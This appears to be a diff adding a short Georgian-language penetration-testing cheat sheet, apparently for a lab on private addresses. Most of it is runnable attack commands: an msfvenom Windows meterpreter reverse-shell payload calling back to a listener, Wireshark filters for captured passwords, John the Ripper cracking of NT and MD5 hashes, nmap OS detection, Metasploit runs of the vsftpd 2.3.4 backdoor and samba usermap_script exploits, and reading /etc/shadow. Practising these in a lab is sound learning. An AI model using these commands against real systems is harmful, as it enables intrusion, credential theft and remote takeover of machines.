@@ -1,0 +1,42 @@
+ერთი სამქულიანი:
+sudo tcpdump -i eth0 192.168.30.200 -nn -w file - ფაილის სახელი
+
+sudo tcpdump -i eth0 192.168.30.200 and port 8080 -w file
+
+მეორე სამქულიანი:
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.0.2.8 lport=6666 -f exe --platform=windows -o windowspayload.exe
+
+
+ვაირშარკ ანალიზი:
+http.request.method=="POST"  OR http contains "password"
+
+დაშიფრული პაროლის გატეხვა:
+john --format=NT file --wordlist=/usr/share/wordlists/metasploit/password.lst 
+                         OR
+john --format=Raw-md5 pass --wordlist=/usr/share/wordlists/metasploit/password.lst
+	
+
+სისტემის გატეხვა
+საკუთარი აიპის გაგება:
+ifconfig
+
+ქსელის დასკანირება:
+nmap 10.0.2.0/24
+
+ოპერაცილი სისტემის გაგება:
+sudo nmap -p 21 -sV -O 10.0.2.15 - 21 ის მაგივრად ვუთითებთ იმ პორტს რომელს სისტეც ექნება გასატეხ სისტემას
+
+sudo msfconsole
+search ftp 234
+use exploit/unix/ftp/vsftpd_234_backdoor     OR    use 1
+set rhosts 10.0.2.15
+option
+run
+
+cat /etc/shadow
+
+სამბათი გატეხვა:
+search samba 
+use 8  or exploit/multi/samba/usermap_script
+
+
